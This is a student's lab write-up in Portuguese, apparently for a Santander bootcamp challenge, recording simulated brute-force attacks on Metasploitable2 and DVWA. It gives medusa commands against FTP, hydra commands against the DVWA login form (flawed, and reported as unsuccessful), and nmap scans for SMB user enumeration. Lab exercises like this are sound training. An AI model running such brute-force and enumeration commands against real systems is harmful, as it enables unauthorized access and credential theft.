@@ -1,0 +1,30 @@
+DESAFIO BOOTCAMP SANTANDER - SIMULANDO ATAQUE DE FORÇA BRUTA
+
+
+--Utilizei para o ataque de força bruta a VM do Metasploitable2 a ferramenta MEDUSA:
+
+1.Antes criei 2 wordlists: usuarios.txt contendo usuarios comuns e senhas.txt contendo senhas comuns (vide prints)
+
+2.Em seguida executei o seguinte comando no MEDUSA:
+
+3.medusa -h 192.168.15.6 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 10 
+
+*Resultado do comando vide prints*
+
+--Para o formulário web (DVWA) foi utilizado a ferramenta HYDRA:
+
+4.hydra -l usuarios.txt -P senhas.txt 192.168.15.6 http-post-form "/dvwa/login.php:username^USER^&password=^PASS^&Login=Login:Login failed" -v -t 10 -f
+
+hydra -l usuarios.txt -P senhas.txt 192.168.15.6 http-post-form "/dvwa/login.php:username^USER^&password=^PASS^&Login=Login:Login failed" -t 1 -w 10
+*Resultado do comando em print*
+
+--Com esse comandos não consegui nenhum êxito, mesmo após ajustar as wordlists e ainda tentei outros parametros no comando mas sem sucesso. 
+
+-Para o password spraying em SMB. Com enumeração de usuários
+
+6.Antes de tudo fiz uma varredura de portas com o nmap. 
+nmap -sV 192.168.15.5
+*Resutado no print*
+
+7.nmap -p 445 --script smb-enum-users 192.168.15.6
+*Resultado vide prints*
